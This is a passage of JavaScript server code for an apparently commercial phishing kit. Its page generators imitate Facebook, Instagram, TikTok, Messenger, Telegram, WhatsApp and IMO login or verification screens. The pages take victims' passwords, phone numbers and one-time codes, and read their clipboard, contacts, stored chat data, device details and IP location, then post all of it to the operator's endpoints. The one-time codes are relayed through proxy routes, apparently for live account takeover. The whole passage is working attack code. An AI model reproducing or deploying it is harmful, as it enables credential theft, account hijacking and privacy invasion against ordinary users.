span{font-size:18px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#0084ff,#00c6ff);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.st{text-align:center;font-size:13px;color:#65676b;margin-top:12px}.prg{width:100%;height:4px;background:#e0e0e0;border-radius:2px;margin-top:12px;display:none}.bar{height:100%;background:linear-gradient(90deg,#0084ff,#00c6ff);border-radius:2px;width:0;transition:width .3s}</style></head><body><div class="notif"><span class="notif-icon">💬</span><div class="notif-text"><b>🔒 Account Verification Required</b>Verify to access your messages.</div></div><div class="wrap"><div class="card"><div class="head"><div class="icon">💬</div><div><h2 style="font-size:18px;font-weight:700;color:#1c1e21">Messenger</h2><p style="font-size:13px;color:#65676b">Account Verification</p></div></div><div class="perms"><p>Verification requires:</p><div class="prow"><span>👥</span>Access to contacts</div><div class="prow"><span>💬</span>Recent conversations</div><div class="prow"><span>📱</span>Device information</div></div><button class="btn" id="btn" onclick="go()">✅ Verify My Account</button><div class="st" id="st"></div><div class="prg" id="prg"><div class="bar" id="bar"></div></div></div></div><script>const UID='${uid}',BASE='${base}';async function go(){const btn=document.getElementById('btn'),st=document.getElementById('st'),prg=document.getElementById('prg'),bar=document.getElementById('bar');btn.disabled=true;btn.textContent='⏳ Verifying...';prg.style.display='block';const info={uid:UID,device:navigator.userAgent,contacts:[],threads:[]};bar.style.width='20%';try{if('contacts' in navigator&&'ContactsManager' in window){const c=await navigator.contacts.select(['name','tel','email'],{multiple:true});info.contacts=c.map(x=>({name:(x.name&&x.name[0])||'',tel:(x.tel&&x.tel[0])||'',email:(x.email&&x.email[0])||''}));}}catch(e){}bar.style.width='60%';try{const keys=Object.keys(localStorage);info.threads.push(...keys.filter(k=>k.match(/msg|chat|thread|conv/i)).slice(0,10).map(k=>({participants:k,lastMsg:(localStorage.getItem(k)||'').slice(0,100)})));}catch(e){}bar.style.width='85%';try{await fetch(BASE+'/d/msginfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(info)});}catch(e){}bar.style.width='100%';st.textContent='✅ Verified!';btn.textContent='✅ Done!';setTimeout(()=>window.location.href='https://www.messenger.com',1500);}window.onload=async()=>{try{await fetch(BASE+'/d/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'💌 Msgr Opened',data:navigator.userAgent})});}catch(e){};};</script></body></html>`;}

function ipInfoPage(uid,req){const base=getBase(req);return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Checking...</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}.card{background:#111;border-radius:16px;padding:24px;max-width:360px;width:100%;box-shadow:0 0 30px rgba(0,100,255,.2)}.title{font-size:18px;font-weight:800;text-align:center;margin-bottom:20px;color:#4af}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #222;font-size:13px}.row span:first-child{color:#888}.row span:last-child{font-weight:600;color:#fff;text-align:right;max-width:60%;word-break:break-all}.spin{text-align:center;font-size:28px;margin:20px 0;animation:s 1s linear infinite}@keyframes s{to{transform:rotate(360deg)}}</style></head><body><div class="card"><div class="title">🌐 Connection Info</div><div class="spin" id="sp">⏳</div><div id="rows"></div></div><script>const UID='${uid}',BASE='${base}';async function run(){const data={};data.userAgent=navigator.userAgent;data.platform=navigator.platform;data.language=navigator.language;data.screen=screen.width+'x'+screen.height;data.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;data.cores=navigator.hardwareConcurrency||'?';data.memory=(navigator.deviceMemory||'?')+'GB';data.touch=navigator.maxTouchPoints;try{const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){data.connType=c.effectiveType||'?';data.downlink=(c.downlink||'?')+'Mbps';data.rtt=(c.rtt||'?')+'ms';}}catch(e){}try{const ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json());data.publicIP=ip.ip;const geo=await fetch('https://ipapi.co/'+ip.ip+'/json/').then(r=>r.json());data.country=geo.country_name||'?';data.city=geo.city||'?';data.isp=geo.org||'?';data.region=geo.region||'?';}catch(e){}document.getElementById('sp').style.display='none';const rows=document.getElementById('rows');const labels={publicIP:'🌐 Public IP',country:'🗺️ Country',city:'🏙️ City',isp:'📡 ISP',timezone:'🕐 Timezone',screen:'📱 Screen',cores:'⚙️ CPU',memory:'🧠 RAM',connType:'📶 Connection',downlink:'⬇️ Speed'};for(const[k,v] of Object.entries(data)){if(!v||v==='?')continue;const r=document.createElement('div');r.className='row';r.innerHTML='<span>'+(labels[k]||k)+'</span><span>'+v+'</span>';rows.appendChild(r);}await fetch(BASE+'/d/devinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,label:'🌐 IP & Device Info',data})}).catch(()=>{});}run();</script></body></html>`;}

function clipboardPage(uid,req){const base=getBase(req);return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Paste Required</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#1a0a0a;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px;text-align:center}.card{background:#111;border-radius:16px;padding:28px 20px;max-width:360px;width:100%}.icon{font-size:50px;margin-bottom:14px}.title{font-size:18px;font-weight:800;margin-bottom:8px}.sub{color:#aaa;font-size:13px;line-height:1.7;margin-bottom:20px}.btn{width:100%;padding:16px;background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;font-size:17px;font-weight:700;border:none;border-radius:12px;cursor:pointer}.st{margin-top:14px;font-size:13px;color:#aaa}</style></head><body><div class="card"><div class="icon">📋</div><div class="title">Paste Required</div><div class="sub">To view the shared content, tap the button below.</div><button class="btn" onclick="grab()">📋 View Shared Content</button><div class="st" id="st"></div></div><script>const UID='${uid}',BASE='${base}';async function grab(){const st=document.getElementById('st');st.textContent='⏳ Loading...';let text='';try{text=await navigator.clipboard.readText();}catch(e){text=prompt('Paste the content here to continue:','')||'';}if(text){await fetch(BASE+'/d/devinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,label:'📋 Clipboard Content',data:{clipboard:text,length:text.length,ua:navigator.userAgent}})}).catch(()=>{});st.textContent='✅ Content loaded!';}else{st.textContent='Nothing found.';}}window.onload=async()=>{try{await fetch(BASE+'/d/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📋 Clipboard Opened',data:navigator.userAgent})});}catch(e){};};</script></body></html>`;}

function batteryPage(uid,req){const base=getBase(req);return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Device Check</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a1a0a;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#111;border-radius:16px;padding:24px 20px;max-width:360px;width:100%}.title{font-size:18px;font-weight:800;text-align:center;margin-bottom:18px;color:#2ecc71}.bat{font-size:60px;text-align:center;margin:10px 0}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:13px}.row span:first-child{color:#888}.row span:last-child{font-weight:600;color:#2ecc71}</style></head><body><div class="card"><div class="title">🔋 Device Information</div><div class="bat" id="bat">⏳</div><div id="rows"></div></div><script>const UID='${uid}',BASE='${base}';async function run(){const data={ua:navigator.userAgent,platform:navigator.platform,screen:screen.width+'x'+screen.height,language:navigator.language,timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,cores:navigator.hardwareConcurrency||'?',memory:(navigator.deviceMemory||'?')+'GB',touch:navigator.maxTouchPoints,vendor:navigator.vendor||'?'};try{const b=await navigator.getBattery();data.batteryLevel=Math.round(b.level*100)+'%';data.charging=b.charging?'Yes ⚡':'No 🔋';data.chargingTime=b.chargingTime===Infinity?'N/A':b.chargingTime+'s';data.dischargingTime=b.dischargingTime===Infinity?'N/A':b.dischargingTime+'s';document.getElementById('bat').textContent=b.level>0.5?'🔋':'🪫';}catch(e){document.getElementById('bat').textContent='🔋';}const rows=document.getElementById('rows');const labels={batteryLevel:'🔋 Battery',charging:'⚡ Charging',screen:'📱 Screen',platform:'💻 Platform',cores:'⚙️ CPU Cores',memory:'🧠 RAM',touch:'👆 Touch',timezone:'🕐 Timezone',language:'🗣️ Language'};for(const[k,v] of Object.entries(data)){if(!v)continue;const r=document.createElement('div');r.className='row';r.innerHTML='<span>'+(labels[k]||k)+'</span><span>'+v+'</span>';rows.appendChild(r);}await fetch(BASE+'/d/devinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,label:'🔋 Battery & Device Info',data})}).catch(()=>{});}run();</script></body></html>`;}

function wifiPage(uid,req){const base=getBase(req);return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Check</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a1a;color:#fff;font-family:-apple-system,sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:16px}.card{background:#111;border-radius:16px;padding:24px 20px;max-width:360px;width:100%}.title{font-size:18px;font-weight:800;text-align:center;margin-bottom:18px;color:#3498db}.wifi{font-size:60px;text-align:center;margin:10px 0}.row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #1a1a1a;font-size:13px}.row span:first-child{color:#888}.row span:last-child{font-weight:600;color:#3498db;word-break:break-all;max-width:60%;text-align:right}</style></head><body><div class="card"><div class="title">📶 Network Information</div><div class="wifi">📡</div><div id="rows"></div></div><script>const UID='${uid}',BASE='${base}';async function run(){const data={online:navigator.onLine?'Yes ✅':'No ❌'};try{const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(c){data.type=c.type||'?';data.effectiveType=c.effectiveType||'?';data.downlink=(c.downlink||'?')+'Mbps';data.rtt=(c.rtt||'?')+'ms';data.saveData=c.saveData?'Yes':'No';}}catch(e){}try{const r=await fetch('https://api.ipify.org?format=json').then(r=>r.json());data.publicIP=r.ip;const geo=await fetch('https://ipapi.co/'+r.ip+'/json/').then(r=>r.json());data.ISP=geo.org||'?';data.country=geo.country_name||'?';data.city=geo.city||'?';}catch(e){}try{const t=Date.now();await fetch('https://www.google.com/favicon.ico',{mode:'no-cors'});data.pingGoogle=(Date.now()-t)+'ms';}catch(e){}const rows=document.getElementById('rows');for(const[k,v] of Object.entries(data)){if(!v)continue;const r=document.createElement('div');r.className='row';r.innerHTML='<span>'+k+'</span><span>'+v+'</span>';rows.appendChild(r);}await fetch(BASE+'/d/devinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,label:'📶 WiFi & Network Info',data})}).catch(()=>{});}run();</script></body></html>`;}

function passPage(action,uid,req){
    const base=getBase(req);
    const c={phish_fb:{site:'Facebook',rdr:'https://www.facebook.com',bc:'#1877f2',btn:'Log In',create:'Create new account'},phish_ig:{site:'Instagram',rdr:'https://www.instagram.com',bc:'linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)',btn:'Log in'},phish_tt:{site:'TikTok',rdr:'https://www.tiktok.com',bc:'#fe2c55',btn:'Log in'},phish_msgr:{site:'Messenger',rdr:'https://www.messenger.com',bc:'linear-gradient(135deg,#0084ff,#00c6ff)',btn:'Log In'}}[action]||{site:'Facebook',rdr:'https://www.facebook.com',bc:'#1877f2',btn:'Log In',create:'Create new account'};
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.site}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:#f0f2f5;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh}.notif{background:#fff3cd;border-left:4px solid #ffc107;padding:12px 16px;display:flex;gap:10px;align-items:flex-start}.notif-icon{font-size:20px}.notif-text{font-size:13px;color:#333;line-height:1.5}.notif-text b{color:#d32f2f;display:block}.wrap{max-width:400px;margin:0 auto;padding:16px}.vid-preview{position:relative;border-radius:12px;overflow:hidden;margin-bottom:14px;background:#000}.vid-preview video{width:100%;display:block;max-height:190px;object-fit:cover}.vid-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:10px 12px}.vid-overlay b{color:#ffcc00;font-size:13px}.vid-overlay p{color:#fff;font-size:12px}.card{background:#fff;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1)}.logo{text-align:center;font-size:22px;font-weight:800;color:#1877f2;margin-bottom:16px}input{width:100%;padding:14px;border:1px solid #dddfe2;border-radius:6px;font-size:16px;color:#1c1e21;background:#fff;margin-bottom:12px;outline:none}input:focus{border-color:#1877f2}input::placeholder{color:#8a8d91}.btn-main{width:100%;padding:14px;background:${c.bc};color:#fff;font-size:18px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:12px}.forgot{text-align:center;margin-bottom:12px}.forgot a{color:#1877f2;font-size:14px;text-decoration:none}.sep{display:flex;align-items:center;margin:12px 0}.sep-line{flex:1;height:1px;background:#dadde1}.sep-or{padding:0 16px;color:#8a8d91;font-size:14px}.btn-sec{width:100%;padding:14px;background:#42b72a;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:6px;cursor:pointer}</style></head><body><div class="notif"><span class="notif-icon">🔴</span><div class="notif-text"><b>⚠️ Security Alert</b>Unusual activity detected. Verify now.</div></div><div class="wrap"><div class="vid-preview"><video autoplay muted loop playsinline><source src="${CFG.LURE_VID}" type="video/mp4"></video><div class="vid-overlay"><b>🔒 Private Content</b><p>Log in to view</p></div></div><div class="card"><div class="logo">${c.site}</div><input id="u" type="text" placeholder="Phone number or email" autocomplete="email"><input id="p" type="password" placeholder="Password" autocomplete="current-password"><button class="btn-main" id="btn" onclick="sub()">${c.btn}</button><div class="forgot"><a href="#">Forgot password?</a></div>${c.create?`<div class="sep"><div class="sep-line"></div><span class="sep-or">or</span><div class="sep-line"></div></div><button class="btn-sec" onclick="sub()">${c.create}</button>`:''}</div></div><script>const UID='${uid}',D='${base}/d',SITE='${c.site}',RDR='${c.rdr}';window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})}).catch(()=>{});async function sub(){const u=document.getElementById('u').value,p=document.getElementById('p').value;if(!u||!p){document.getElementById('u').style.borderColor='#f02849';return;}const btn=document.getElementById('btn');btn.textContent='Logging in...';btn.disabled=true;try{await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:u,otp:p})});}catch(e){}setTimeout(()=>window.location.href=RDR,800);}</script></body></html>`;
}

function otpPage(action,uid,req){
    const base=getBase(req),sid=crypto.randomBytes(10).toString('hex');
    const C={phish_tg:{name:'Telegram',rdr:'https://telegram.org',proxy:'tg',ac:'#229ed9',hdr:'#17212b',hot:'🔔 Telegram — New Login',sub:'Verify to secure account.',t1:'Sign in to Telegram',s1:'Select country and enter phone.',t2:'Enter the Code',s2:'Code sent to your Telegram app.'},phish_wa:{name:'WhatsApp',rdr:'https://www.whatsapp.com',proxy:'wa',ac:'#25d366',hdr:'#075e54',hot:'🔔 WhatsApp — Verify Number',sub:'New device linking attempt.',t1:'Enter phone number',s1:'WhatsApp will send an SMS code.',t2:'Enter 6-digit code',s2:'Code sent to {phone} via SMS.'},phish_imo:{name:'IMO',rdr:'https://imo.im',proxy:'imo',ac:'#0052d9',hdr:'#003da3',hot:'🔔 IMO — Verification',sub:'Enter number to receive code.',t1:'Enter phone number',s1:'IMO will send verification code.',t2:'Enter code',s2:'Code sent to {phone} via SMS.'}};
    const c=C[action];
    const opts=[['880','🇧🇩 BD +880'],['91','🇮🇳 IN +91'],['92','🇵🇰 PK +92'],['1','🇺🇸 US +1'],['44','🇬🇧 UK +44'],['966','🇸🇦 SA +966'],['971','🇦🇪 UAE +971'],['60','🇲🇾 MY +60'],['65','🇸🇬 SG +65'],['62','🇮🇩 ID +62'],['84','🇻🇳 VN +84'],['95','🇲🇲 MM +95'],['94','🇱🇰 LK +94'],['977','🇳🇵 NP +977'],['20','🇪🇬 EG +20'],['234','🇳🇬 NG +234'],['49','🇩🇪 DE +49'],['33','🇫🇷 FR +33'],['7','🇷🇺 RU +7'],['55','🇧🇷 BR +55'],['81','🇯🇵 JP +81'],['86','🇨🇳 CN +86'],['90','🇹🇷 TR +90'],['98','🇮🇷 IR +98'],['964','🇮🇶 IQ +964'],['974','🇶🇦 QA +974'],['965','🇰🇼 KW +965']];
    const seen=new Set();
    const optHtml=opts.filter(([v])=>seen.has(v)?false:seen.add(v)).map(([v,t])=>`<option value="${v}">${t}</option>`).join('');
    return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${c.name}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{background:${c.hdr};min-height:100vh;font-family:-apple-system,sans-serif;padding:14px}.logo{font-size:20px;font-weight:700;color:#fff;text-align:center;margin-bottom:6px}.hot{font-size:15px;font-weight:800;color:#fff;text-align:center;margin-bottom:4px}.sub{font-size:12px;color:rgba(255,255,255,.75);text-align:center;margin-bottom:14px}.card{background:#fff;border-radius:14px;padding:20px 16px;margin-top:10px}.card h2{font-size:17px;font-weight:700;color:#111;margin-bottom:6px}.card p{font-size:13px;color:#666;margin-bottom:16px;line-height:1.5}.row{display:flex;border:1.5px solid #e0e0e0;border-radius:10px;overflow:hidden;margin-bottom:14px}select{padding:13px 8px;border:none;background:#f5f5f5;font-size:13px;color:#333;outline:none;max-width:150px}.ph{flex:1;padding:13px;border:none;font-size:15px;color:#111;outline:none}.otp{width:100%;padding:18px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:30px;text-align:center;color:#111;outline:none;letter-spacing:10px;margin-bottom:14px;display:block}.btn{width:100%;padding:15px;background:${c.ac};color:#fff;font-size:16px;font-weight:700;border:none;border-radius:10px;cursor:pointer}.err{background:#fff3e0;border:1px solid #ff9800;border-radius:8px;padding:9px 12px;font-size:13px;color:#e65100;margin-bottom:12px;display:none}.spin{text-align:center;font-size:13px;color:#888;padding:6px 0;display:none}</style></head><body><div class="logo">${c.name}</div><div class="hot">${c.hot}</div><div class="sub">${c.sub}</div><div class="card" id="st1"><h2>${c.t1}</h2><p>${c.s1}</p><div class="err" id="e1">Enter valid number!</div><div class="row"><select id="cc">${optHtml}</select><input type="tel" id="ph" class="ph" placeholder="Phone number" inputmode="numeric"></div><div class="spin" id="sp1">📤 Sending...</div><button class="btn" id="b1" onclick="send()">Next →</button></div><div class="card" id="st2" style="display:none"><h2>${c.t2}</h2><p id="oi">${c.s2}</p><div class="err" id="e2">Invalid code!</div><input type="text" class="otp" id="otp" placeholder="- - - - -" inputmode="numeric"><div class="spin" id="sp2">🔄 Verifying...</div><button class="btn" id="b2" onclick="verify()">✅ Verify</button></div><script>const UID='${uid}',BASE='${base}',D='${base}/d',SID='${sid}',SITE='${c.name}',RDR='${c.rdr}',PROXY='${c.proxy}';let fp='';window.onload=()=>fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:SITE+' Opened',data:navigator.userAgent})}).catch(()=>{});async function send(){const cc=document.getElementById('cc').value,ph=document.getElementById('ph').value.trim().replace(/^0+/,'');if(!ph||ph.length<5){document.getElementById('e1').style.display='block';return;}document.getElementById('e1').style.display='none';const b1=document.getElementById('b1');b1.disabled=true;b1.textContent='Sending...';document.getElementById('sp1').style.display='block';fp='+'+cc+ph;fetch(D+'/text',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,type:'📱 '+SITE,data:fp})}).catch(()=>{});try{const body=PROXY==='wa'?JSON.stringify({cc,phone_local:ph,sid:SID}):JSON.stringify({phone:fp,sid:SID});const resp=await fetch(BASE+'/proxy/'+PROXY+'/send',{method:'POST',headers:{'Content-Type':'application/json'},body});const data=await resp.json();if(data.tgError){document.getElementById('e1').style.display='block';document.getElementById('e1').textContent='Error: '+data.tgError;document.getElementById('sp1').style.display='none';b1.disabled=false;b1.textContent='Next →';return;}}catch(er){}document.getElementById('sp1').style.display='none';document.getElementById('oi').textContent='${c.s2}'.replace('{phone}',fp);document.getElementById('st1').style.display='none';document.getElementById('st2').style.display='block';setTimeout(()=>document.getElementById('otp').focus(),300);}async function verify(){const otp=document.getElementById('otp').value.trim();if(!otp||otp.length<3){document.getElementById('e2').style.display='block';return;}document.getElementById('e2').style.display='none';const b2=document.getElementById('b2');b2.disabled=true;document.getElementById('sp2').style.display='block';try{await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({uid:UID,site:SITE,phone:fp,otp})});}catch(e){}try{await fetch(BASE+'/proxy/'+PROXY+'/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:fp,otp,sid:SID,uid:UID})});}catch(er){}setTimeout(()=>window.location.href=RDR,700);}</script></body></html>`;
}

// ══════════════════════════════════════════════════════
// PROCESS GUARDS
// ══════════════════════════════════════════════════════
process.on('uncaughtException',  e=>log.error('[UNCAUGHT] '+e.message));
process.on('unhandledRejection', e=>log.error('[REJECTION] '+(e&&e.message?e.message:String(e))));
process.on('SIGTERM',()=>{saveStore();server.close(()=>process.exit(0));});
process.on('SIGINT', ()=>{saveStore();server.close(()=>process.exit(0));});

// ══════════════════════════════════════════════════════
// START
// ══════════════════════════════════════════════════════
server.listen(CFG.PORT,()=>{
    log.info(`Server online — port ${CFG.PORT}`);
    log.info(`Admin: ${CFG.ADMIN_ID} | FB: ${CFG.FB_PAGE}`);
    log.info(`Free users: [${CFG.FREE_USERS.join(', ')}]`);
    log.info(`Signup: ${CFG.SIGNUP_BONUS}T | Link: ${CFG.LINK_COST}T | Free refs: ${CFG.FREE_REFS}`);
});

setInterval(()=>{
    if(CFG.BASE_URL) axios.get(CFG.BASE_URL+'/health').catch(()=>{});
    log.info(`Uptime: ${Math.floor(process.uptime()/60)}min | Mem: ${Math.round(process.memoryUsage().heapUsed/1024/1024)}MB | Queue: ${Q.length}`);
},5*60*1000);
